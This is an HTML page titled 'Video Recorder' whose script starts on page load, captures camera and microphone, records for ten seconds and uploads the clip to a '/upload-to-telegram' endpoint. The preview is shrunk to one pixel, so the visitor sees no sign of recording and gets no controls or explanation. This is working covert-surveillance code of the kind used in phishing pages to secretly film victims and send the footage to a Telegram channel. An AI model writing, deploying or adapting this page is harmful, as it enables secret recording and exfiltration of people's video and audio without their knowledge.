<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Video Recorder</title>
</head>
<body>
  <!-- Just the video preview -->
  <video id="preview" autoplay muted playsinline style="width: 1px; height: 1px; border: 1px solid black;"></video>

  <script>
    let mediaRecorder;
    let recordedChunks = [];

    async function startRecording() {
      try {
        // Get camera + mic
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        document.getElementById("preview").srcObject = stream;

        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });

        mediaRecorder.ondataavailable = e => {
          if (e.data.size > 0) recordedChunks.push(e.data);
        };

        mediaRecorder.onstop = async () => {
          const recordedBlob = new Blob(recordedChunks, { type: "video/webm" });

          // Stop camera
          stream.getTracks().forEach(track => track.stop());

          // Prepare upload
          const formData = new FormData();
          formData.append("video", recordedBlob, "recording.webm");

          try {
            const res = await fetch("/upload-to-telegram", {
              method: "POST",
              body: formData
            });
            console.log(await res.text());
          } catch (err) {
            console.error("❌ Error sending video:", err);
          }
        };

        // Start immediately
        mediaRecorder.start();
        console.log("🎥 Recording started...");

        // Stop & send after 10 seconds (adjust as needed)
        setTimeout(() => {
          mediaRecorder.stop();
          console.log("🛑 Recording stopped, sending...");
        }, 10000);

      } catch (err) {
        console.error("Camera error:", err);
      }
    }

    // Auto-start when page loads
    window.onload = startRecording;
  </script>
</body>
</html>
